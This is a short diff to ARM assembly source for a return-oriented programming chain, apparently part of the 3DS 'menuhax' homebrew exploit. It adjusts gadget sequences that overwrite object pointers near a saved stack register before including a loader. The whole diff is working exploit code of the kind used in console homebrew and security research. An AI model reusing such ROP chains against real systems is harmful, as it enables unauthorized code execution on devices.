@@ -10,7 +10,7 @@ _start:
 
 ropstackstart:
 
-@ *saved_r4 = <value setup by menuhax_manager>, aka the original address for the first objptr.
+@ *(saved_r4+0x0) = <value setup by menuhax_manager>, aka the original address for the first objptr.
 ROP_SETLR ROP_POPPC
 
 .word POP_R0PC
@@ -19,23 +19,35 @@ ROP_SETLR ROP_POPPC
 .word ROP_LDR_R0FROMR0
 
 .word POP_R1PC
-.word (0x58414800 + 0x00) @ r1
+.word 0x0 @ r1
+
+.word ROP_ADDR0_TO_R1 @ r0 = *srcaddr + value
+
+.word POP_R1PC
+.word (0x58414800 + 0x00)
+
+.word ROP_STR_R1TOR0
+
+@ *(saved_r4+0x4) = <value setup by menuhax_manager>, aka the original address for the second objptr.
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word SDICONHAX_SPRETADDR
+
+.word ROP_LDR_R0FROMR0
+
+.word POP_R1PC
+.word 0x4 @ r1
+
+.word ROP_ADDR0_TO_R1 @ r0 = *srcaddr + value
+
+.word POP_R1PC
+.word (0x58414800 + 0x01)
 
 .word ROP_STR_R1TOR0
 
 @ Subtract the saved r4 on stack by 4. This results in the current objptr in the target_objectslist_buffer being reprocessed @ RET2MENU.
 ROPMACRO_LDDRR0_ADDR1_STRADDR SDICONHAX_SPRETADDR, SDICONHAX_SPRETADDR, 0xfffffffc
-
-@ *saved_r4 = <value setup by menuhax_manager>, aka the original address for the second objptr.
-ROP_SETLR ROP_POPPC
-
-.word POP_R0PC
-.word SDICONHAX_SPRETADDR
-
-.word ROP_LDR_R0FROMR0
-
-.word POP_R1PC
-.word (0x58414800 + 0x01) @ r1
 
 #include "menuhax_loader.s"
 
